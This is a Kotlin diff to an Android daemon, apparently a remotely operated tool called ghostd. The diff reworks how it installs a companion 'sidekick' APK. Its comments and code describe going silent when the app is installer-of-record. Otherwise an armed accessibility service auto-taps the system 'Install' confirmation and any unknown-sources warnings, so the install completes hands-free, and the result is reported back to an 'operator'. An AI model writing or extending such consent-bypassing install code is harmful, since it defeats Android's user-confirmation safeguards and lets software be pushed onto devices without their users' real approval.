@@ -1,9 +1,6 @@
 package com.tg.ghostd
 
-import android.app.PendingIntent
 import android.content.Context
-import android.content.Intent
-import android.content.pm.PackageInstaller
 import org.json.JSONObject
 import java.io.File
 
@@ -20,12 +17,14 @@ import java.io.File
  *      on first install, so Android shows the system confirm dialog and the
  *      USER MUST TAP "Install" — the armed sidekick AUTO-TAPS it
  *      ("Install" is in GhostAccessibilityService.CONFIRM_TEXTS), so in
- *      practice it completes hands-free. If the OEM allows silent install
- *      (or on UPDATE of a sidekick ghostd installed before — then ghostd IS
- *      the installer-of-record and PackageInstaller goes silent), no dialog
- *      appears at all. Silent is preferred whenever the OS grants it; the
- *      confirm+auto-tap path is the reliable fallback.
- *   4. Result JSON tells the operator which flow to expect.
+ *      practice it completes hands-free. On UPDATE of a sidekick ghostd
+ *      installed before — then ghostd IS the installer-of-record and
+ *      PackageInstaller goes SILENT (setRequireUserAction(
+ *      USER_ACTION_NOT_REQUIRED) on API 31+). Silent is preferred whenever
+ *      the OS grants it; the confirm+auto-tap path is the reliable fallback.
+ *   4. The command blocks until the FINAL install status and returns it
+ *      (see AppUpdater.installApk); result JSON tells the operator which
+ *      flow ran ("silent" flag).
  *
  * The sidekick's armed state also auto-confirms any "app installed from
  * unknown sources" warnings that some OEMs add on top.
@@ -49,36 +48,14 @@ object SidekickInstaller {
             SidekickLink.send(JSONObject().put("cmd", "arm"))
         } catch (_: Exception) {
         }
-
-        val installer = ctx.packageManager.packageInstaller
-        val params = PackageInstaller.SessionParams(
-            PackageInstaller.SessionParams.MODE_FULL_INSTALL
+        // Silent when we are the installer-of-record (updates of a ghosta we
+        // installed before); otherwise the confirm+auto-tap fallback.
+        return AppUpdater.installApk(
+            ctx, apkPath,
+            requireNoUserAction = AppUpdater.isInstallerOfRecord(
+                ctx, AppUpdater.SIDEKICK_PACKAGE
+            ),
+            sessionName = "ghosta"
         )
-        val session = installer.openSession(installer.createSession(params))
-        try {
-            session.openWrite("ghosta", 0, f.length()).use { out ->
-                f.inputStream().use { it.copyTo(out) }
-            }
-            // Status callback: system-delivered broadcast, explicitly targeted
-            // at our package. Mutable so PackageInstaller can fill in status
-            // extras (required to specify mutability on Android 12+).
-            val status = PendingIntent.getBroadcast(
-                ctx, 0,
-                Intent("com.tg.ghostd.SIDEKICK_INSTALL_STATUS")
-                    .setPackage(ctx.packageName),
-                PendingIntent.FLAG_MUTABLE
-            )
-            session.commit(status.intentSender)
-        } finally {
-            session.close()
-        }
-        return JSONObject()
-            .put("apk", f.absolutePath)
-            .put("size", f.length())
-            .put("status", "install_submitted")
-            .put(
-                "note",
-                "confirm dialog expected on first install; armed sidekick auto-taps Install"
-            )
     }
 }
